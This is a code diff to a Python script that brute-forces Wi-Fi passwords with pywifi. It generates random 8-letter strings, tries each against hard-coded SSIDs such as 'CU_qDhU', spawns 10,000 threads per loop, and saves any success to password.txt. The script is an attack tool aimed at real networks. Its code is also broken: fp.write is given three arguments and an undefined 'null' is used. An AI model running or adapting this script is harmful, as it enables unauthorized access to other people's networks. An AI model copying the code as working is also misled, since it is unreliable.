@@ -4,10 +4,25 @@ from pywifi import const
 import string
 import random
 
+## u23wx9ni
+
 def random_sentence(size):
     # 生成8位随机字符串，小写字母和数字组成
-    char_lists = string.ascii_lowercase + string.digits
+    # char_lists = string.ascii_lowercase + string.digits
+    # return ''.join(random.choice(char_lists) for _ in range(size))
+    
+    # 生成8位随机字符串，大小写字母组成
+    char_lists = string.ascii_lowercase + string.ascii_uppercase
     return ''.join(random.choice(char_lists) for _ in range(size))
+    
+    
+    # 生成8位随机数， 小写字母组成
+    # char_lists = string.ascii_lowercase
+    # return ''.join(random.choice(char_lists) for _ in range(size))
+    
+    # 生成8位随机数， 数字组成
+    # char_lists = string.digits
+    # return ''.join(random.choice(char_lists) for _ in range(size))
     
 def test_connect(findStr, ssidname):
     profile = pywifi.Profile()
@@ -35,18 +50,29 @@ def test_connect(findStr, ssidname):
         isOk = False
         print('密码错误：{}'.format(findStr))
     iface.disconnect()
-    time.sleep(1)
+    time.sleep(2)
     return isOk
-
-if __name__ == '__main__':
     
-    ssidname = 'CMCC-5TK2'
-    while True:
-        myStr = random_sentence(8)
-        if test_connect(myStr, ssidname):
-            with open('password.txt', 'a') as fp:
-                fp.write(str(myStr), '-->', ssidname)
-            break
-        
+import threading
 
+
+def inifunc():    
+    ssidname = 'CU_qDhU'
+    
+    myStr = random_sentence(8)
+    if test_connect(myStr, ssidname):
+        with open('password.txt', 'a') as fp:
+            fp.write(str(myStr), '-->', ssidname)
+
+import sys    
+if __name__ == '__main__':
+    while True:
+    
+        for i in range(10000):
+            threading.Thread(target=inifunc).start()
+        
+        time.sleep(10)
+        with open('password.txt', 'r') as fr:
+            if fr.read() is not null:
+                sys.exit()
     
